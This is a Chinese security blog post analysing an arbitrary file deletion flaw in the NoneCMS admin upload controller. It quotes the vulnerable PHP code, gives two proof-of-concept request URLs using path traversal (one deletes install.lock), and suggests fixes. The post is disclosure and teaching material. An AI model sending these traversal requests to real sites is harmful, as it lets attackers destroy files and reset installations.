=== Content from blackwolfsec.cc_c86921c6_20250125_222139.html ===


[BlackWolf](/)
# BlackWolfsec

* [首页](/)
* [分类](/categories)
* [归档](/archives)
* [标签](/tags)
* [我的简历](/about)
* 搜索

## NoneCMS后台任意文件删除

发表于
2018-01-22

|

分类于
[代码审计](/categories/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/)

|

## 0x00前言

这两天学习Thinkphp5.1的开发手册，顺便审计一下[NoneCMS](http://www.5none.com/)，利用框架的安全性避免了不少的问题，但还是发现一枚任意文件删除漏洞。

## 0x01漏洞分析

| ``` 1234567891011121314151617181920212223242526272829303132 ``` | ``` #application/admin/controller/Main.php    public function upload()    {        if (!input('?param.act')) {            $file = request()->file('pic_url');            $info = $file                ->validate(['size'=> 1024*1024*2,'ext'=>['jpg', 'png', 'jpeg', 'gif', 'bmp']])                ->move(Env::get('root_path') . 'public/uploads');            if ($info) {                // 成功上传后 获取上传信息                $save_name = $info->getSaveName();                $realpath =  __ROOT__.'/uploads/' . $save_name;                exit(json_encode(['status' => 1, 'path' => $realpath, 'save_name' => $save_name]));            } else {                // 上传失败获取错误信息                exit(json_encode(['status' => 0, 'error' => $file->getError()]));            }        } else {            //删除图片            $img_dir = input('param.path');            $real_path = str_replace(Env::get('root_path'),'',$img_dir);            $path = str_replace(['/..\/','/../'],'/',Env::get('root_path').$real_path);            echo  $path ;            if (@unlink($path)) {                exit(json_encode(['status' => 1, 'msg' => '删除成功']));            } else {                exit(json_encode(['status' => 0, 'msg' => '删除失败']));            }        }    } ``` |
| --- | --- |

1.当请求upload方法时，如果if (!input(‘?param.act’))不成立，即存在act参数的情况下，进入else分支。
2.此时将path参数的值经过str\_replace替换后传入unlink函数，直接删除，由于过滤不严导致任意文件删除。
3.可以采用绝对路径的方式或者windows下用`..\`绕过str\_replace的限制。

## 0x02任意文件删除POC:

| ``` 123 ``` | ``` http://127.0.0.1/NoneCMS/public/admin/main/upload/act/1?path=public/install/install.lockhttp://127.0.0.1/NoneCMS/public/admin/main/upload/act/1?path=..\..\..\..\..\..\..\test.txt ``` |
| --- | --- |

## 0x03小结

这个漏洞需要至少能够登录后台的管理员登录才能利用。

## 0x04修复建议

* 此处功能为删除图片，可以严格检查删除文件名的后缀是否为图片
* 同时过滤`..\`和`../`

[# PHP](/tags/PHP/)
[# 代码审计](/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/)
[# CVE](/tags/CVE/)

[B2evolution安装过程过滤不严导致Getshell漏洞分析（CVE-2017-1000423）](/2018/01/17/b2evolution_getshell/ "B2evolution安装过程过滤不严导致Getshell漏洞分析（CVE-2017-1000423）")

[NoneCMS1.3版本SSRF漏洞](/2018/01/23/Nonecms_ssrf/ "NoneCMS1.3版本SSRF漏洞")

* 文章目录
* 站点概览

![邮箱地址：YWRtaW5AYmxhY2t3b2xmc2VjLmNj](/static/picture/logo.jpg)

邮箱地址：YWRtaW5AYmxhY2t3b2xmc2VjLmNj

[53
日志](/archives)

[10
分类](/categories/index.html)

[51
标签](/tags/index.html)

[RSS](/atom.xml)

[安全圈](http://anquanquan.info "安全圈")

[小黑屋](http://das.scusec.org/ "小黑屋")

[ourren](http://www.ourren.com/ "ourren")

[零の杂货铺](http://phantom0301.cc/ "零の杂货铺")

1. [1. 0x00前言](#0x00前言)
2. [2. 0x01漏洞分析](#0x01漏洞分析)
3. [3. 0x02任意文件删除POC:](#0x02任意文件删除POC)
4. [4. 0x03小结](#0x03小结)
5. [5. 0x04修复建议](#0x04修复建议)

© 2016 -
2020

邮箱地址：YWRtaW5AYmxhY2t3b2xmc2VjLmNj

由 [Hexo](https://hexo.io) 强力驱动

主题 -
[NexT.Mist](http://blackwolfsec.cc/)


